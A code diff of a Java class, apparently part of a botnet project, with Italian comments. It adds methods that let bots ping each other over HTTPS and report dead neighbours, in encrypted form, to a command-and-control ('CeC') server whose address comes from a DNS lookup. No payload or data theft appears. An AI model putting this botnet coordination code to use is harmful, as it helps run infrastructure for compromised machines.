@@ -4,6 +4,7 @@ import java.io.ByteArrayInputStream;
 import java.security.PublicKey;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Iterator;
 import java.util.List;
 import java.util.concurrent.Future;
 
@@ -50,13 +51,39 @@ public class BotRequest {
 
 	// response = restTemplate.postForObject(url, obj, response.getClass());
 
+//	@Async
+//	public Future<String> pingUser(String ipBot) {
+//		Integer counter = 0;
+//		while (counter <= REQNUMBER) {
+//			try {
+//				System.out.println("\nRichiesta ad :" + ipBot);
+//				String response = restTemplate.postForObject("http://" + ipBot + "/bot/ping", null, String.class);
+//				return new AsyncResult<>(response);
+//			} catch (Exception e) {
+//				// e.printStackTrace();
+//				System.out.println("\nSono Morto: " + ipBot + " Causa: " + e.getMessage());
+//				counter++;
+//				// Aspetto prima della prossima richiesta
+//				try {
+//					Thread.sleep(WAIT_RANGE);
+//				} catch (InterruptedException ex) {
+//					System.err.println("Errore sleep" + ex);
+//					ex.printStackTrace();
+//				}
+//			}
+//		}
+//		return null;
+//	}
+	
+	
 	@Async
-	public Future<String> pingUser(String ipBot) {
+	public Future<Boolean> pingToBot(String ipBot) {
 		Integer counter = 0;
 		while (counter <= REQNUMBER) {
 			try {
-				System.out.println("\nRichiesta ad :" + ipBot);
-				String response = restTemplate.postForObject("http://" + ipBot + "/bot/ping", null, String.class);
+				String url = HTTPS + ipBot + PORT + "/cec/neighbours";
+				System.out.println("Effettuo Ping a " + ipBot);
+				Boolean response = restTemplate.postForObject(url, null, Boolean.class);
 				return new AsyncResult<>(response);
 			} catch (Exception e) {
 				// e.printStackTrace();
@@ -73,6 +100,7 @@ public class BotRequest {
 		}
 		return null;
 	}
+	
 
 	@Async
 	public Future<Pairs<IP, Integer>> esempioRichiesta(String uriMiner) {
@@ -142,7 +170,53 @@ public class BotRequest {
 		}
 		return null;
 	}
+	
+	/**
+	 * @param iPCeC
+	 * @param ipBot
+	 * @param iDBot
+	 */
 
+	public ArrayList<Pairs<String, String>> sendDeadNeighToCeC(String iPCeC,String myIdBot,List<IP> deadBotList) {
+		ArrayList<Pairs<String, String>> result = new ArrayList<Pairs<String, String>>();
+		Integer counter = 0;
+		String encryptData = "";
+		// richiesta del vicinato
+		encryptData = pki.getCrypto().encryptAES(myIdBot);
+
+		List<String> data = new ArrayList<String>();
+
+		data.add(myIdBot);
+		for (IP obj: deadBotList) {
+			data.add(obj.toString());
+		}
+		
+		while (counter <= REQNUMBER) {
+			try {
+				String url = HTTPS + iPCeC + PORT + "/cec/neighbours/sync";
+				System.out.println("Richiesta Vicinato a " + url);
+				byte[] buf;
+				buf = restTemplate.postForObject(url, encryptData, byte[].class);
+				ByteArrayInputStream rawData = new ByteArrayInputStream(buf);
+				result = (ArrayList<Pairs<String, String>>) cUtil.decrypt(rawData);
+				System.out.println("ritorna " + result);
+				return result;
+			} catch (Exception e) {
+				counter++;
+				System.out.println("errore richiesta vicinato");
+				try {
+					Thread.sleep(WAIT_RANGE);
+				} catch (InterruptedException e2) {
+					e2.printStackTrace();
+				}
+			}
+
+		}
+		return null;
+	}
+
+	
+	
 	// da valutare se devono essere asincroni
 	public Pairs<String, String> getIpCeCFromDnsServer(String dnsUrl) {
 		Pairs<String, String> cec = new Pairs<String, String>();
